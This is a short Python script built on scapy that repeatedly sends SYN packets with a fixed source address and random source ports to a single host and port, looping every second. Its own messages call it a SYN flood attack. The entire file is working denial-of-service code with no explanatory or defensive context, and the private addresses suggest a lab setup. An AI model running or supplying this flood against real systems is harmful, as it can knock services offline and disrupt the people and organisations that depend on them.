#! /usr/local/bin/python3

from scapy.all import *
import random
import time

source_ip = "192.168.1.100"  
destination_ip = "10.47.21.100"  
target_port = 5211

# Function to send 100 SYN packets
def send_syn_flood():
    for _ in range(100):
        src_port = random.randint(1024, 65535)  
        seq_num = random.randint(1000, 9000)  

        # Construct the TCP SYN packet
        syn_packet = IP(src=source_ip, dst=destination_ip) / TCP(sport=src_port, dport=target_port, flags="S", seq=seq_num)

        send(syn_packet, verbose=False)

# Continuous loop to send SYN flood every second
try:
    while True:
        send_syn_flood()
        print(f"[+] Sent 100 SYN packets from {source_ip} to {destination_ip} on port {target_port}")
        time.sleep(1)  
except KeyboardInterrupt:
    print("\n[!] Stopped SYN flood attack.")